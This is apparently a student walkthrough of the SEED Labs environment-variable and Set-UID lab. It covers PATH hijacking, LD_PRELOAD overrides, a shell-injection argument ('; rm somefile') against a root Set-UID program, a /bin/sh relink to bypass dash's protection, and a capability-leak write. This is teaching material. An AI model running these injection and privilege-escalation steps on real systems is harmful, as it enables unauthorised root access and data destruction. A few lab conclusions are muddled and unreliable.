## SEED Labs – Environment Variable and Set-UID Program Lab 1
The Set-UID mechanism in Unix-based systems is indeed a powerful feature, but it can also be a significant security risk if not handled correctly. When a program with the Set-UID bit set is executed, it runs with the permissions of the file's owner, not the user who executed it. This can be useful for programs that need to perform specific tasks that require elevated privileges, but it can also be exploited if there are vulnerabilities in the program.

### 2.1 Task 1: Manipulating Environment Variables
#### 1. Printing Environment Variables:
**Objective**: Understand how to view environment variables.
**Using `env`**:

-   To print all environment variables:
```bash
env
``` 
-   To print a specific environment variable, such as `PWD`, using `grep`:
```bash
env | grep PWD
```
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/1eaca8ba-198f-468a-a6e3-b6f2aa53a78f)

#### 2. Setting Environment Variables:
**Objective**: Learn how to set environment variables.
**Using `export`**:

-   To set a new environment variable named `MY_VAR` with the value "Hello":
```bash
export MY_VAR="Hello"
```
- To verify that the variable has been set, we can print it:
```bash
echo $MY_VAR
```
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/c762f0d6-a6c2-4311-b70d-75aa0e0a3a19)

#### 3. Unsetting Environment Variables:
**Objective**: Learn how to remove environment variables.
**Using `unset`**:

-   To remove the environment variable named `MY_VAR`:
```bash
unset MY_VAR
```
- To verify that the variable has been removed, we will try to print it. We shouldn't see any output:
```bash
echo $MY_VAR
```
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/c6733551-4916-4da2-9a11-b6eb199720eb)

### 2.2 Task 2: Passing Environment Variables from Parent Process to Child Process

#### Step 1: Observing Environment Variables in Child Process
**Objective**: Understand if the child process inherits environment variables from its parent.

**Steps**:

1.  Compile the given `myprintenv.c` program:
```bash
gcc myprintenv.c -o myprintenv
```
2.  Run the compiled program and save the output to a file:
```bash
./myprintenv > file1.txt
```
3.  Observe the contents of `file1.txt`. This file contains the environment variables of the child process.
    

#### Step 2: Observing Environment Variables in Parent Process
**Objective**: Understand the environment variables in the parent process.

**Steps**:

1.  Modify the `myprintenv.c` program:
    
    -   Comment out the `printenv();` statement in the child process case.
    -   Uncomment the `printenv();` statement in the parent process case.
2.  Compile the modified program:
```bash
gcc myprintenv.c -o myprintenv
```
3.  Run the compiled program again and save the output to another file:
```bash
./myprintenv > file2.txt
```
4.  Observe the contents of `file2.txt`. This file contains the environment variables of the parent process.
    

#### Step 3: Comparing the Outputs
**Objective**: Determine if there's any difference between the environment variables of the parent and child processes.

**Steps**:

1.  Use the `diff` command to compare the two files:
```bash
diff file1.txt file2.txt
```
2.  Observe the output. If there's no difference between the two files, it means the child process inherits all the environment variables from its parent. If there are differences, they will be displayed.
    
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/d6ca5777-f97f-46f4-9dd2-06221770629d)

**Conclusion**: Based on the results of the `diff` command, it can be concluded whether the child process inherits its environment variables from the parent process or not. Given the nature of the `fork()` system call, it is expected that the child process will inherit the environment variables from its parent, so there should be no differences between the two files.

### 2.3 Task 3: Environment Variables and `execve()`

#### Step 1: Observing Environment Variables with `execve()`

**Objective**: Understand how environment variables are passed when executing a new program using `execve()`.

**Steps**:

1.  Compile the given `myenv.c` program:
```bash
gcc myenv.c -o myenv
```
2.  Run the compiled program:
```bash
./myenv
```
3.  Observe the output. This will display the environment variables of the current process when the `/usr/bin/env` program is executed without explicitly passing any environment variables.

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/2852d967-20e3-4a6e-9d87-f96bee03b5ab)
    
#### Step 2: Modifying the `execve()` Invocation

**Objective**: Understand how explicitly passing environment variables affects the executed program.

**Steps**:

1.  Modify the `myenv.c` program by changing the invocation of `execve()` to:
```bash
execve("/usr/bin/env", argv, environ);
```
2.  Compile the modified program:
```bash
gcc myenv.c -o myenv
```
3.  Run the compiled program again:
```bash
./myenv
```
4.  Observe the output. This will display the environment variables of the current process when the `/usr/bin/env` program is executed with explicitly passing the environment variables.
    
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/d3729dc0-f107-4141-a729-b393395247a8)

#### Step 3: Drawing Conclusions

Based on the observations from steps 1 and 2:

1. If the environment variables in both runs are the same, this indicates that by default the `execve()` function passes the environment variables of the calling process to the new program, even if we do not pass them explicitly.
2.     
3.  If there's a difference between the two runs, it indicates that the environment variables are not passed to the new program unless explicitly provided.
    

**Expected Conclusion**: The `execve()` function, when executed without explicitly passing the environment variables, does not automatically pass them to the new program. However, when the environment variables are explicitly passed as the third argument, the new program inherits them.

### 2.4 Task 4: Environment Variables and `system()`

**Objective**: Understand how environment variables are passed when executing a new program using `system()`.

**Steps**:

1.  **Write the C Program**:
    
    Create a file named `mysystem.c` and add the following code:
```bash
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/usr/bin/env");
    return 0;
}
```
2.  **Compile the Program**:
```bash
gcc mysystem.c -o mysystem
```
3.  **Run the Compiled Binary**:
```bash
./mysystem
```

This will execute the `/usr/bin/env` program using the `system()` function and print out the environment variables. Since `system()` internally uses `/bin/sh` to execute the given command, the environment variables of the calling process (in this case, our C program) are passed to `/bin/sh`, which in turn passes them to `/usr/bin/env`.

By observing the output, we can verify that the environment variables of the calling process are indeed passed to the new program executed via `system()`.

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/38d9f471-4b7c-4113-b8e5-4bb0c83596fd)

### 2.5 Task 5: Environment Variable and Set-UID Programs

#### Step 1: Write the Program to Print Environment Variables

We've been provided with a program that prints out all the environment variables in the current process. The code is:
```bash
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

int main() {
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
    return 0;
}
```
Save this code in a file named `printenv.c`.

#### Step 2: Compile, Change Ownership, and Set Set-UID

**Steps**:

1.  Compile the program:
```bash
gcc printenv.c -o foo
```
2.  Change the ownership of the compiled binary to `root`:
```bash
sudo chown root foo
```
3.  Make the binary a Set-UID program:
```bash
sudo chmod 4755 foo
```
#### Step 3: Set Environment Variables and Run the Set-UID Program

**Steps**:

1.  Set the `PATH`, `LD_LIBRARY_PATH`, and a custom environment variable (e.g., `ANY_NAME`):
```bash
export PATH=$PATH:/home/seed/Desktop
export LD_LIBRARY_PATH=/home/seed/Desktop/Environment%20Variable%20and%20Set-UID%20Lab%0A
export ANY_NAME="This is a custom environment variable"
```
2.  Run the Set-UID program:
```bash
./foo
```
3.  Observe the output. This will display the environment variables of the process running the Set-UID program.
    
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/b75deaa4-3fb8-4ac5-9d80-f7d927c3448e)

**Expected Observations**:

-   The Set-UID program should inherit all the environment variables from the calling process (our shell). This means we should see `PATH`, `LD_LIBRARY_PATH`, and `ANY_NAME` in the output.
-   However, certain environment variables, especially ones that can influence the behavior of dynamically linked programs like `LD_LIBRARY_PATH`, can be a security risk for Set-UID programs. Some systems might clear or modify such variables for Set-UID programs to prevent potential security issues.

**Conclusion**: By observing the output, we'll understand how environment variables are inherited by Set-UID programs and whether any variables are cleared or modified for security reasons.


### 2.6 Task 6: The `PATH` Environment Variable and Set-UID Programs

#### Step 1: Write the Set-UID Program

Here's the provided program:
```bash
#include <stdlib.h>

int main() {
    system("ls");
    return 0;
}
```
Save this code in a file named `setuid_ls.c`.

#### Step 2: Compile, Change Ownership, and Set Set-UID

**Steps**:

1.  Compile the program:
```bash
gcc setuid_ls.c -o setuid_ls
```
2.  Change the ownership of the compiled binary to `root`:
```bash
sudo chown root setuid_ls
```
3.  Make the binary a Set-UID program:
```bash
sudo chmod 4755 setuid_ls
```

#### Step 3: Link `/bin/sh` to `/bin/zsh`

To bypass the countermeasure in `/bin/dash`, link `/bin/sh` to `/bin/zsh`:
```bash
sudo ln -sf /bin/zsh /bin/sh
```
#### Step 4: Exploit the Set-UID Program

**Objective**: Trick the Set-UID program into running a malicious program instead of `/bin/ls`.

**Steps**:

1.  Create a malicious program named `ls`:
```bash
echo 'echo "This is a malicious script!"' > ~/malicious_ls.sh
chmod +x ~/malicious_ls.sh
```
2.  Modify the `PATH` variable to prioritize the directory containing the malicious `ls`:
```bash
export PATH=~/:$PATH
```
3.  Run the Set-UID program:
```bash
./setuid_ls
```

**Expected Observations**:

-   Instead of running the actual `/bin/ls` command, the Set-UID program will run the malicious `ls` script.
-   If the malicious code runs with root privileges, it indicates that the Set-UID program is vulnerable to a `PATH` manipulation attack.

**Conclusion**: Using relative paths in Set-UID programs, especially in conjunction with the `system()` function, is dangerous. Malicious users can manipulate the `PATH` environment variable to trick the Set-UID program into running arbitrary code with elevated privileges.

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/e08bcabe-13c9-42c9-86b3-34f3dd070283)


### 2.7 Task 7: The `LD_PRELOAD` Environment Variable and Set-UID Programs

#### Step 1: Create a Dynamic Link Library

1.  **Write the Library Code**:
    
    Create a file named `mylib.c` with the following content:
```bash
#include <stdio.h>

void sleep(int s) {
    printf("I am not sleeping!\n");
}
```
2.  **Compile the Library**:
```bash
gcc -fPIC -g -c mylib.c
gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
```
3.  **Set the `LD_PRELOAD` Environment Variable**:
```bash
export LD_PRELOAD=./libmylib.so.1.0.1
```
4.  **Write the Test Program**:
    
    Create a file named `myprog.c` with the following content:
```bash
#include <unistd.h>

int main() {
    sleep(1);
    return 0;
}
```
    
Compile the program:
```bash
gcc myprog.c -o myprog
```  
#### Step 2: Test the Program Under Different Conditions

1.  **Run as a Regular Program**:
```bash
./myprog
```  
Observe the output. The overridden `sleep()` function should be called, printing "I am not sleeping!".

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/834b122c-7acf-4200-9c99-7aa86bfc106b)

2.  **Run as a Set-UID Root Program**:
```bash
sudo chown root myprog
sudo chmod 4755 myprog
./myprog
```  
Observe the output.
    
3.  **Run as Set-UID Root with `LD_PRELOAD` in Root Account**:
    
First, switch to the root account:
```bash
sudo su
```  
Set the `LD_PRELOAD` variable:
```bash
export LD_PRELOAD=./libmylib.so.1.0.1
```  
Run the program:
```bash
./myprog
```  
Observe the output.

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/c58b9de3-346b-4040-b35b-a194afd82497)

4.  **Run as Set-UID for Another User**:
    
Create another user:
```bash
sudo adduser user1
``` 
Change the ownership of the program to `user1`:
```bash
sudo chown user1 myprog
``` 
Switch to another user account (not root) and set the `LD_PRELOAD`:
```bash
su user1
export LD_PRELOAD=./libmylib.so.1.0.1
``` 
Run the program:
```bash
./myprog
``` 
Observe the output.
    
![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/2c81006c-e4aa-42dc-a9fc-a4dfbd214ed5)

#### Step 3: Draw Conclusions

For the output of the Set-UID (`./myprog`) program, if it printed "I'm not sleeping!", it means that the `LD_PRELOAD` environment variable is still in effect, and the program is using the `sleep(override)` function from the custom library. If it didn't print anything, it indicates that the system ignores the `LD_PRELOAD` variable for Set-UID programs as a security measure.


### 2.8 Task 8: Invoking External Programs Using `system()` versus `execve()`

#### Step 1: Using `system()`

1.  **Compile the Program**:
```bash
gcc catall.c -o catall
```  
2.  **Make it a Root-Owned Set-UID Program**:
```bash
sudo chown root catall
sudo chmod 4755 catall
```  
3.  **Attempt to Compromise System Integrity**:
    
	The `system()` function invokes the shell to execute the command. This means that if we can inject shell characters or commands into the input, we may be able to execute arbitrary commands with root privileges.    
	
    Try running the program with a malicious argument:
```bash
./catall "; rm somefile"
```  
In this example, a semicolon (`;`) allows us to execute multiple commands. After the `cat` command runs, the `rm` command will try to remove `somefile`. If `somefile` is a file that we normally wouldn't have permission to delete, but it is deleted, then we have successfully compromised system integrity using the Set-UID program.

For example, let's say we have a file named `testfile.txt` in our current directory. We can use the `catall` program to display its software:
```bash
./catall testfile.txt
``` 
If `testfile.txt` contains the text "Hello, World!", the program should display:
```bash
Hello, World!
``` 
After creating the file, we can then run the `catall` program with `testfile.txt` as the argument.

#### Step 2: Using `execve()`

1.  **Modify the Program**:
    
    Comment out the `system(command)` line and uncomment the `execve(v[0], v, NULL);` line in `catall.c`.
    
2.  **Compile and Set Permissions**:
```bash
gcc catall.c -o catall
sudo chown root catall
sudo chmod 4755 catall
```  
3.  **Test the Program Again**:
    
    Try the same attack as before:
```bash
./catall "; rm somefile"
```  
With `execve()`, the program should not interpret the semicolon as a command separator, and thus the `rm` command should not execute. This demonstrates that `execve()` is safer than `system()` in this context.
    

### Conclusion:

Using `system()` in Set-UID programs can be dangerous because it invokes the shell, which can interpret and execute additional commands. This can be exploited by attackers to run arbitrary commands with elevated privileges. On the other hand, `execve()` directly executes the specified program without invoking a shell, making it less susceptible to command injection attacks.

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/66d6760b-5fdb-4ae6-b713-e9c24c11f914)

### Task 9: Capability Leaking

**Objective**: Understand the vulnerability of capability leaking in Set-UID programs.

**Observations**:

The program that the assignment provided demonstrates a classic example of a capability leak. Below is a breakdown of the program:

1. The program tries to open the file `/etc/zzz` with read and append permissions. If successful, it will have a file descriptor `fd` that points to this file.
2. It then prints the file descriptor value.
3. The program then drops its root privilege by setting its effective user ID to the real user ID.
4. Finally, it executes `/bin/sh` to give us a shell.

The vulnerability here is that even though the program drops its privilege, the file descriptor `fd` that was opened with root privilege is still valid. This means that any process that inherits this file descriptor can write to the file `/etc/zzz`, even if it's running with normal user privileges.

To exploit this vulnerability:

1. Run the Set-UID program. we'll get a shell.
2. In the shell, use the file descriptor value (let's say it's `x`) that was printed out to write to the file `/etc/zzz`. we can do this with the following command:
   ```bash
   echo "malicious data" >&x
   ```
   Replace `x` with the actual file descriptor value that was printed.

3. Exit the shell and check the contents of `/etc/zzz`. we should see "malicious data" appended to the file.

This demonstrates that even though the program dropped its root privilege, the capability (in this case, the file descriptor with write permission to a root-owned file) was leaked to the unprivileged shell, allowing a normal user to write to a file they shouldn't have access to.

**Code Snippet**:
  ```bash
void main()
{
int fd;
...
fd = open("/etc/zzz", O_RDWR | O_APPEND);
...
setuid(getuid());
v[0] = "/bin/sh"; v[1] = 0;
execve(v[0], v, 0);
}

   ```
**Explanation**: This code demonstrates the vulnerability of capability leaking. The program opens a file with root privileges but drops its privileges without closing the file descriptor. This allows a normal user to write to a file they shouldn't have access to.

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/caf815d7-fa8c-4cd8-9e92-d7eb2a9fde3e)

![image](https://github.com/adilng/Environment_Variable_and_Set-UID_ProgramLab/assets/74984955/1ac3f93a-972a-4aa4-9fa0-d194a4eab677)
